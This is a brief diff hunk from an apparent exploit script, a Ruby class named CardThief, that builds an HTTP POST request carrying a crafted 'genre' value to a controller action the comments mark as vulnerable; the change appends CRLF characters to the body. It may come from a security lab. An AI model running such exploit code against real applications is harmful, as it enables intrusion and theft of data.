@@ -87,7 +87,7 @@ class CardThief
 	    # as url encoded parameters to the HTTP POST request 
 		request_body = "authenticity_token=" + CGI::escape(auth_token) + "&" \
 		   "genre=" + CGI::escape(egg) + "&" \
-		   "commit=Show+Movies"
+		   "commit=Show+Movies\r\n\r\n"
 
 		# construct the full HTTP POST request for the showGenre action in the movies_controller
 		# this is the action that has the vulnerability
